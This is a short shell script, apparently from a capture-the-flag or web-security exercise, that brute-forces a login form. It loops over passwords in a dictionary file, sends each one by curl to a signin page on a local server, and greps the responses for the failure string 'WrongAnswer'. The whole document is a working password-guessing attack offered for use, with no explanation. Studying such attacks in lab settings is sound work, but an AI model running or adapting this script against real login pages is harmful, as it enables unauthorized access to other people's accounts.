while read -r pwd; do
	echo "password :[$pwd]"
	curl -i http://127.0.0.1:8080/index.php\?page\=signin\&username\=signin\&password\=$pwd\&Login\=Login\# | grep "WrongAnswer"
	
done < "dict.txt"
